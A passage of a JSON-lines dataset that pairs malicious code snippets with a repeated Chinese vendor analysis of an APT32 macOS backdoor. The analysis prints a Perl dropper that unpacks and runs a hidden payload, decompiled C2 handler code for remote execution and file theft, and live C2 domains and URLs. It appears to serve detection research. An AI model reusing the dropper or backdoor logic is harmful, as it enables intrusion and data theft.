\n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "removefile(&v79);", "hash_code": "093d6e094c12649f5ae72a3d92a227b7cd6a894d497814e0bb72b615e5c1860c", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "pthread_create(&v84, &v153, respondUploadThread, v44);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "pthread_create(&v84,&v153,respondUploadThread,v44);", "hash_code": "28f59a520e4090be2876d98e7b7f0f068a93449fab9e58e1ec76ba228dfb55e3", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "v5 = (char *)&v153; pthread_create(&v84, &v153, (void *(*)(void *))respondownloadThread, v44);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split 